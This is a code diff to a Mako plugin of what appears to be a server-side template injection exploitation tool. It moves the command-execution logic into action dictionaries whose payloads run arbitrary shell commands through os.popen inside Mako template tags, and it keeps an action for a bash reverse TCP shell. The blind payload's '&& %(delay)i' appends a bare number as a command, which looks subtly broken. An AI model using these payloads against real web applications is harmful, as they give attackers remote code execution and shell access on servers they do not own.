@@ -1,6 +1,5 @@
 from core import languages
 from core.plugin import Plugin
-from utils.strings import quote, chunkit, md5
 from utils.loggers import log
 from utils import rand
 
@@ -46,6 +45,14 @@ class Mako(Plugin):
         'reverse_tcp_shell' : {
             'call': 'execute_blind',
             'reverse_tcp_shell' : languages.bash_reverse_tcp_shell
+        },
+        'execute_blind' : {
+            'call': 'evaluate_blind',
+            'execute_blind': """import os; x=os.popen("%(code)s && %(delay)i").read()"""
+        },
+        'execute' : {
+            'call' : 'render',
+            'execute' : '<%% import os; x=os.popen("%(code)s").read() %%>${x}'
         }
 
     }
@@ -99,14 +106,6 @@ class Mako(Plugin):
         payload = """<% import sys, os; x=os.name; y=sys.platform; %>${x}-${y}"""
         self.set('evaluate', 'python')
         self.set('os', self.render(payload))
-
-    def execute(self, command):
-
-        return self.render("""<%% import os; x=os.popen("%s").read() %%>${x}""" % (quote(command)))
-
-    def execute_blind(self, command):
-
-        return self.inject("""<%% import os; os.popen("%s").read() %%>""" % (quote(command)), blind=True)
 
     def detect_blind_engine(self):
 
